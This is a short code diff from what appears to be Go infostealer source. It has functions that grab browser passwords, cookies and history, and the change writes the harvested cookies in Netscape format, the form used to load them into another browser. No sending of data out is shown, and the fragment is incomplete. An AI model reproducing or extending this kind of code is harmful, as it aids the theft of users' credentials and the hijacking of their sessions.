@@ -18,7 +18,7 @@ func GetBrowserPasswords() {
 }
 
 func GetBrowserCookies() {
-	os.WriteFile("cookies.json", []byte(cookies.Get()), 0644)
+	os.WriteFile("cookies_netscape.txt", []byte(cookies.Get()), 0644)
 }
 
 func GetBrowserHistory() {
